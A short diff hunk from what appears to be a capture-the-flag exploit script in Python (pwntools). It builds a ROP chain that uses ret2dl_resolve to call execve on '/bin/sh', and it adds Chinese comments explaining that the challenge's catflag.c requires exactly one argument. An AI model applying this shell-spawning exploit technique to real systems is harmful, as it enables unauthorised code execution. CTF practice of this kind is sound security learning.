@@ -81,6 +81,8 @@ payload += rop.call('read', 0, fake_resolve_start, 100)
 #并调用execve(fake_resolve_start+8, fake_resolve_start, 0)
 #即execve("/bin/sh", 指向参数数组的指针, 指向环境数组的指针)
 #这里参数无所谓，但必须要有，环境数组的指针为0. 具体为什么需要问出题人怎么魔改的/bin/sh文件
+#19-5-11更新：因为sd出题人的catflag.c:43中的一句 if (argc == 1)
+#所以直接调用execve函数需要有参数，且只能有一个
 payload += rop.dl_resolve_call(fake_resolve_start + 50, fake_resolve_start+8, fake_resolve_start,0)
 #gdb.attach(session, '\n'.join(['b*0x080484ae', 'c', "b*0x08048519", "b*system"]))
 if mode != 'debug': time.sleep(1)
